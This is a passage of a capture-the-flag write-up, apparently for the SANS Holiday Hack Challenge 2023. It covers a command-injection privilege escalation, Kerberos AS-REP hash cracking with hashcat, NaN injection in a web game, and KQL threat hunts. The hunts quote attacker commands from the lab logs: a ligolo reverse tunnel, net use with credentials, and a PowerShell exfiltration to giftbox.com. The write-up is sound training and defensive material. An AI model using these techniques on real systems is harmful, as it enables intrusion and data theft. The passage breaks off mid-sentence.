+</code></pre><p>Looks like it's just piping the input to <code>cp</code> so <code>cp src dst</code>. So this copies
+<code>/root</code> to <code>/home/elf</code>: <code>/usr/bin/simplecopy '-r /root' '/home/elf/'</code> but the
+permissions are not changed.</p><p>After relogging to the machine, it worked. With <code>whoami</code> I can see I am root. So
+now I can see inside the <code>/root</code> directory.</p><pre tabindex=0><code>$ /usr/bin/simplecopy &#39;--ss&#39; &#39;;ls /root&#39;
+cp: unrecognized option &#39;--ss&#39;
+Try &#39;cp --help&#39; for more information.
+runmetoanswer
+
+$ /usr/bin/simplecopy &#39;--ss&#39; &#39;;/root/runmetoanswer&#39;
+cp: unrecognized option &#39;--ss&#39;
+Try &#39;cp --help&#39; for more information.
+Who delivers Christmas presents?
+
+&gt; [waits for prompt]
+</code></pre><p>Now I need to answer the question. <code>Santa</code> is not the correct answer.
+Answer was actually <code>santa</code>. We could also see the help for this binary with</p><pre tabindex=0><code>$ /usr/bin/simplecopy &#39;--ss&#39; &#39;;/root/runmetoanswer --help&#39;
+cp: unrecognized option &#39;--ss&#39;
+Try &#39;cp --help&#39; for more information.
+D&#39;aww, people hardly ever ask me for help! Nice to meet you!
+
+The usage is really easy, we promise! Just pass your answer as a commandline argument, like:
+
+    ./runtoanswer MyWonderfulAnswer
+
+Or just run ./runtoanswer by itself, and it&#39;ll ask for your answer!
+
+Bye now!
+</code></pre><p>Hint from Rose Mold after finishing:</p><blockquote><p>There's a hidden, uncharted area somewhere along the coast of this island, and
+there may be more around the other islands.</p><p>The area is supposed to have something on it that's totes worth, but I hear
+all the bad vibe toys chill there.</p></blockquote><p>In the hints:</p><blockquote><p>Uncharted</p><p>Not all the areas around Geese Islands have been mapped, and may contain
+wonderous treasures. Go exploring, hunt for treasure, and find the pirate's
+booty!</p></blockquote><p>Treasure? Does it mean all the ports? I've already found all of them. Hmm.</p><h1 id=hashcat>Hashcat
+<a class=header-link href=#hashcat><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><p>Eve Snowshoes is trying to recover a password. Head to the Island of Misfit Toys
+and take a crack at it!</p><blockquote><p>Determine the hash type in hash.txt and perform a wordlist cracking attempt to
+find which password is correct and submit it to /bin/runtoanswer</p></blockquote><pre tabindex=0><code>$ cat hash.txt 
+$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:[removed]$[removed]
+</code></pre><p>It appears to be a Kerberos ticket <code>$krb5asrep$23$&lt;user>@&lt;realm>:&lt;long_string></code>:</p><ul><li><code>$krb5asrep$</code>: It's a Kerberos AS-REP (Authentication Service Response) ticket.</li><li><code>23</code>: The version number of the Kerberos protocol. <code>asdsad</code></li><li><code>&lt;user></code>: The username associated with the ticket, <code>alabaster_snowball</code>.</li><li><code>&lt;realm></code>: The Kerberos realm, <code>XMAS.LOCAL</code>.</li><li><code>&lt;long_string></code>: The actual encrypted ticket data.</li></ul><p>Break with hashcat</p><pre tabindex=0><code>$ hashcat -m 18200 -w 1 -u 1 --kernel-accel 1 --kernel-loops 1 \
+    --force hash.txt password_list.txt
+# removed
+
+Candidates.#1....: 1LuvCandyC4n3s!2022 -&gt; iLuvC4ndyC4n3s!23!
+</code></pre><p>Now we need to see the password.</p><pre tabindex=0><code>$ hashcat -m 18200 --show hash.txt   
+$krb5asrep$23$alabaster_snowball@XMAS.LOCAL:[22865a2bceeaa73227ea4021879eda02]$[string]:IluvC4ndyC4nes!
+
+$ /bin/runtoanswer IluvC4ndyC4nes!
+Your answer: IluvC4ndyC4nes!
+
+Checking....
+Your answer is correct!
+</code></pre><p>Answer: <code>IluvC4ndyC4nes!</code>.</p><h1 id=luggage-lock>Luggage Lock
+<a class=header-link href=#luggage-lock><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Help Garland Candlesticks on the Island of Misfit Toys get back into his
+luggage by finding the correct position for all four dials.</p></blockquote><p>Hint:</p><blockquote><p>Check out Chris Elgee's <a href="https://www.youtube.com/watch?v=ycM1hBSEyog" target=_blank rel="noreferrer noopener">talk</a> regarding his and his wife's luggage.
+Sounds weird but interesting!</p></blockquote><ol><li>Align the notches.</li><li>Try.</li><li>If it doesn't work, move each item one right and try again.</li></ol><p>Put pressure on the opening lock and spin the numbers until they get stuck.</p><h1 id=naan>Na'an
+<a class=header-link href=#naan><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Shifty McShuffles is hustling cards on Film Noir Island. Outwit that meddling
+elf and win!</p></blockquote><p>Hint:</p><blockquote><p>Try to outsmart Shifty by sending him an error he may not understand.</p></blockquote><p><a href=https://www.tenable.com/blog/python-nan-injection target=_blank rel="noreferrer noopener">https://www.tenable.com/blog/python-nan-injection</a></p><p>We have to modify the payload to send <code>nan</code> instead of the numbers.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span>POST /action?id=<span style=color:#2aa198>971</span>d<span style=color:#2aa198>000</span>d<span style=color:#2aa198>-84e3</span><span style=color:#2aa198>-48</span>fd-b<span style=color:#2aa198>78</span>f<span style=color:#2aa198>-971</span>da<span style=color:#2aa198>824e6</span>a<span style=color:#2aa198>1</span> HTTP/<span style=color:#2aa198>2</span>
+</span></span><span style=display:flex><span>Host: nannannannannannan.com
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{<span style=color:#268bd2>&#34;play&#34;</span>:<span style=color:#2aa198>&#34;5,4,3,2,1&#34;</span>}
+</span></span></code></pre></div><p>Either use Burp or put a breakpoint on the line below and modify the values of
+<code>array_of_choices_as_csv</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#268bd2>function</span> play_card_selection(array_of_choices_as_csv) {
+</span></span><span style=display:flex><span>    armsopen()
+</span></span><span style=display:flex><span>    <span style=color:#719e07>if</span> (<span style=color:#719e07>!</span><span style=color:#b58900>Array</span>.isArray(array_of_choices_as_csv)) {
+</span></span><span style=display:flex><span>        Talk(<span style=color:#2aa198>&#34;That was not a valid array of string choices!&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#719e07>return</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>var</span> isstringarr <span style=color:#719e07>=</span> array_of_choices_as_csv =&gt; array_of_choices_as_csv.every(i =&gt; <span style=color:#719e07>typeof</span> i <span style=color:#719e07>===</span> <span style=color:#2aa198>&#34;string&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#719e07>if</span> (<span style=color:#719e07>!</span>isstringarr) {
+</span></span><span style=display:flex><span>        Talk(<span style=color:#2aa198>&#34;That was not a valid array of string choices!&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#719e07>return</span>
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#268bd2>var</span> rid <span style=color:#719e07>=</span> getIdFromUrlOrDefault() <span style=color:#586e75>// &lt;--- HERE
+</span></span></span></code></pre></div><h1 id=phish-detection-agency>Phish Detection Agency
+<a class=header-link href=#phish-detection-agency><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Not suggesting a full-blown forensic analysis, just mark the ones screaming
+digital fraud.</p></blockquote><p>Hint:</p><blockquote><p>Discover the essentials of email security with DMARC, DKIM, and SPF at
+<a href=https://www.cloudflare.com/learning/email-security/dmarc-dkim-spf/ target=_blank rel="noreferrer noopener">Cloudflare's Guide</a>.</p></blockquote><ol><li><code>DMARC: Fail</code> -> phishing.</li><li><code>DMARC: Pass</code> but not from <code>mail.geeseislands.com</code> -> phishing.</li></ol><h1 id=kql-kraken-hunt>KQL Kraken Hunt
+<a class=header-link href=#kql-kraken-hunt><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h1><blockquote><p>Use Azure Data Explorer to <a href=https://detective.kusto.io/sans2023 target=_blank rel="noreferrer noopener">uncover misdeeds</a> in Santa's IT enterprise.
+Go to Film Noir Island and talk to Tangle Coalbox for more information.</p></blockquote><p>From Tangle Coalbox</p><blockquote><p>Before you start, you'll need to create a <a href=https://dataexplorer.azure.com/freecluster target=_blank rel="noreferrer noopener">free cluster</a>.</p></blockquote><p>Hints:</p><blockquote><p>Do you need to find something that happened via a process? Pay attention to
+the ProcessEvents table!</p><p>Once you get into the <a href=https://detective.kusto.io/sans2023 target=_blank rel="noreferrer noopener">Kusto trainer</a>, click the blue Train me for the
+case button to get familiar with KQL.</p><p>Looking for a file that was created on a victim system? Don't forget the
+FileCreationEvents table.</p></blockquote><p>Notes:</p><p><code>has</code> operator == <code>contains</code>
+<code>==</code> operator or case-insensitive <code>=~</code> operator</p><p>Which employee has the IP address: '10.10.0.19'?</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>Employees 
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> ip_addr <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;10.10.0.19&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Candy Cane Sugarplum
+</span></span></code></pre></div><p>How many emails did Santa Claus receive?</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>Email
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> recipient <span style=color:#719e07>=~</span> <span style=color:#2aa198>&#34;santa_claus@santaworkshopgeeseislands.org&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> summarize <span style=color:#719e07>count</span>() <span style=color:#719e07>by</span> recipient
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#719e07>//</span> the solution uses <span style=color:#2aa198>&#34;count&#34;</span> <span style=color:#719e07>like</span> this
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Email
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> recipient <span style=color:#719e07>=~</span> <span style=color:#2aa198>&#39;santa_claus@santaworkshopgeeseislands.org&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>count</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#2aa198>19</span>
+</span></span></code></pre></div><p><code>summarize dcount(sender)</code> or <code>distinct sender</code>.</p><p><code>OutboundNetworkEvents</code> table contains websites browsed by employees.
+User name is not recorded, but each user has one assigned IP address in the
+<code>Employees</code> table.</p><p>The 3rd question in the training is wrong. It asks "How many unique websites did
+Rudolph Rednose visit?". There's no employee by that name in the <code>Employees</code>
+table.</p><p>The solution uses the IP for "Rudolph Wreathington" (only employee with Rudolph
+in their name) and the answer from that solution is not accepted.</p><p>KQL Cheatsheet: <a href=https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/kql-quick-reference target=_blank rel="noreferrer noopener">https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/kql-quick-reference</a></p><h2 id=onboarding>Onboarding
+<a class=header-link href=#onboarding><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p><strong>How many Craftperson Elf's are working from laptops?</strong></p><p>The <code>Employees</code> table has a column <code>hostname</code>. Laptop users' machines end in
+<code>LAPTOP</code> like <code>RZLS-LAPTOP</code>.</p><p>My initial mistake was not looking at the roles. Not every employee has the
+<code>Craftperson Elf</code> role.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>Employees
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> <span style=color:#719e07>role</span> has <span style=color:#2aa198>&#34;craftsperson&#34;</span> <span style=color:#719e07>and</span> hostname has <span style=color:#2aa198>&#34;laptop&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> summarize dcount(hostname)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#2aa198>25</span>
+</span></span></code></pre></div><h2 id=case-1>Case 1
+<a class=header-link href=#case-1><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>The alert says the user clicked the malicious link
+<code>http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>Email
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> link <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx&#34;</span>
+</span></span></code></pre></div><p><strong>What is the email address of the employee who received this phishing email?</strong>
+<code>alabaster_snowball@santaworkshopgeeseislands.org</code></p><p><strong>What is the email address that was used to send this spear phishing email?</strong><br><code>cwombley@gmail.com</code></p><p><strong>What was the subject line used in the spear phishing email?</strong>
+<code>[EXTERNAL] Invoice foir reindeer food past due</code></p><h2 id=case-2>Case 2
+<a class=header-link href=#case-2><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>Employees
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> email_addr <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;alabaster_snowball@santaworkshopgeeseislands.org&#34;</span>
+</span></span></code></pre></div><p><strong>What is the role of our victim in the organization?</strong>
+<code>Head Elf</code></p><p><strong>What is the hostname of the victim's machine?</strong>
+<code>Y1US-DESKTOP</code></p><p><strong>What is the source IP linked to the victim?</strong>
+<code>10.10.0.4</code></p><h2 id=case-3>Case 3
+<a class=header-link href=#case-3><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>OutboundNetworkEvents
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> url <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;http://madelvesnorthpole.org/published/search/MonthlyInvoiceForReindeerFood.docx&#34;</span>
+</span></span></code></pre></div><p><strong>What time did Alabaster click on the malicious link? Make sure to copy the exact timestamp from the logs!</strong>
+<code>2023-12-02T10:12:42Z</code></p><p><strong>What file is dropped to Alabaster's machine shortly after he downloads the malicious file?</strong>
+Assuming "shortly" here is an hour. We can use <code>between</code>. Note how I had to pass
+the time stamp text to <code>datetime</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>FileCreationEvents
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> hostname <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;Y1US-DESKTOP&#34;</span> <span style=color:#719e07>and</span> <span style=color:#719e07>timestamp</span> <span style=color:#719e07>between</span>(datetime(<span style=color:#2aa198>2023</span><span style=color:#719e07>-</span><span style=color:#2aa198>12</span><span style=color:#719e07>-</span><span style=color:#2aa198>02</span>T10:<span style=color:#2aa198>12</span>:<span style=color:#2aa198>42</span>Z) .. datetime(<span style=color:#2aa198>2023</span><span style=color:#719e07>-</span><span style=color:#2aa198>12</span><span style=color:#719e07>-</span><span style=color:#2aa198>02</span>T11:<span style=color:#2aa198>12</span>:<span style=color:#2aa198>42</span>Z))
+</span></span></code></pre></div><p>We see two results, the first is the docx, and the second is the answer:
+<code>C:\ProgramData\Windows\Jolly\giftwrap.exe</code>.</p><h2 id=case-4>Case 4
+<a class=header-link href=#case-4><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Analyzing what <code>giftwrap.exe</code> did.</p><p><strong>The attacker created an reverse tunnel connection with the compromised machine. What IP was the connection forwarded to?</strong>
+I couldn't find any data with <code>process_name</code> or <code>parent_process_name</code> set
+to <code>giftwrap</code>. So I just listed all the events for that machine and then looked
+at the events near the timestamp after download file event in the previous
+answer.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>ProcessEvents
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> hostname <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;Y1US-DESKTOP&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#719e07>#</span> <span style=color:#719e07>found</span> this command
+</span></span><span style=display:flex><span><span style=color:#2aa198>&#34;ligolo&#34;</span> <span style=color:#586e75>--bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
+</span></span></span></code></pre></div><p><code>113.37.9.17</code></p><p><strong>What is the timestamp when the attackers enumerated network shares on the machine?</strong>
+The command is <code>net share</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>ProcessEvents
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> process_commandline has <span style=color:#2aa198>&#34;net share&#34;</span>
+</span></span></code></pre></div><p><code>2023-12-02T16:51:44Z</code></p><p><strong>What was the hostname of the system the attacker moved laterally to?</strong></p><blockquote><p>In other words, they move payloads from one endpoint to another and execute
+them. Adversaries do this with native utilities like net.exe</p></blockquote><p>Source: <a href=https://redcanary.com/threat-detection-report/techniques/windows-admin-shares/ target=_blank rel="noreferrer noopener">https://redcanary.com/threat-detection-report/techniques/windows-admin-shares/</a></p><p>So we need to look for <code>net use</code></p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>ProcessEvents
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> hostname <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;Y1US-DESKTOP&#34;</span> <span style=color:#719e07>and</span> process_commandline has <span style=color:#2aa198>&#34;net use&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#719e07>//</span> <span style=color:#719e07>result</span>
+</span></span><span style=display:flex><span>cmd.exe <span style=color:#719e07>/</span><span style=color:#719e07>C</span> net use \\NorthPolefileshare\<span style=color:#719e07>c</span>$ <span style=color:#719e07>/</span><span style=color:#719e07>user</span>:<span style=color:#719e07>admin</span> AdminPass123
+</span></span></code></pre></div><p><code>NorthPolefileshare</code></p><h2 id=case-5>Case 5
+<a class=header-link href=#case-5><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>Commands might be base64 encoded.</p><p><code>extend</code> adds a column to the result table.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>Employees 
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> name <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;Santa Claus&#34;</span> 
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> extend Base64Name<span style=color:#719e07>=</span>base64_encode_tostring(name)
+</span></span></code></pre></div><p><code>base64_decode_tostring</code> does decoding.</p><p><strong>When was the attacker's first base64 encoded PowerShell command executed on Alabaster's machine?</strong>
+Let's see which commands on the machine had the string <code>powershell</code>.</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>ProcessEvents
+</span></span><span style=display:flex><span><span style=color:#719e07>|</span> <span style=color:#719e07>where</span> hostname <span style=color:#719e07>==</span> <span style=color:#2aa198>&#34;Y1US-DESKTOP&#34;</span> <span style=color:#719e07>and</span> process_commandline has <span style=color:#2aa198>&#34;powershell&#34;</span>
+</span></span></code></pre></div><p>First result is actually wrong.</p><p>We're looking for the 2nd which happend in <code>2023-12-24T16:07:47Z</code></p><p><strong>What was the name of the file the attacker copied from the fileshare? (This might require some additional decoding)</strong>
+<code>NaughtyNiceList.txt</code></p><p>The 2nd command with a base64 payload decodes into this:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>( <span style=color:#2aa198>&#39;txt.tsiLeciNythguaN\potkseD\:C txt.tsiLeciNythguaN\lacitirCnoissiM\$c\erahselifeloPhtroN\\
+</span></span></span><span style=display:flex><span><span style=color:#2aa198>    metI-ypoC c- exe.llehsrewop&#39;</span> -split <span style=color:#2aa198>&#39;&#39;</span> | %{<span style=color:#268bd2>$_</span>[<span style=color:#2aa198>0</span>]}) -join <span style=color:#2aa198>&#39;&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>// after reverse
+</span></span><span style=display:flex><span>powershell.exe -c <span style=color:#b58900>Copy-Item</span>
+</span></span><span style=display:flex><span>    \\NorthPolefileshare\c$\MissionCritical\NaughtyNiceList.txt
+</span></span><span style=display:flex><span>    C:\Desktop\NaughtyNiceList.txt
+</span></span></code></pre></div><p><strong>The attacker has likely exfiltrated data from the file share. What domain name was the data exfiltrated to?</strong>
+<code>giftbox.com</code></p><p>Another payload after base64 decode decodes into:</p><div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>[<span style=color:#cb4b16>StRiNg</span>]::JoIn( <span style=color:#2aa198>&#39;&#39;</span>, [<span style=color:#cb4b16>ChaR[]</span>]([<span style=color:#cb4b16>removed</span>]))|&amp; ((<span style=color:#b58900>gv </span><span style=color:#2aa198>&#39;*MDr*&#39;</span>).NamE[<span style=color:#2aa198>3</span>,<span style=color:#2aa198>11</span>,<span style=color:#2aa198>2</span>]-joiN
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75># According to ChatGPT</span>
+</span></span><span style=display:flex><span><span style=color:#b58900>Download-File</span> C:\Desktop\NaughtyNiceList.docx \\giftbox.com\file
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#586e75># It&#39;s actually wrong, the correct answer is</span>
+</span></span><span style=display:flex><span>downwithsanta.exe -exfil C:\\Desktop\\NaughtNiceList.docx \\giftbox.com\file
+</span></span></code></pre></div><h2 id=case-6>Case 6
+<a class=header-link href=#case-6><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>We know that the attackers stole Santa's naughty or nice list. What else
+happened? Can you find the final malicious command the attacker ran?</p><p>The final base64 encoded command is
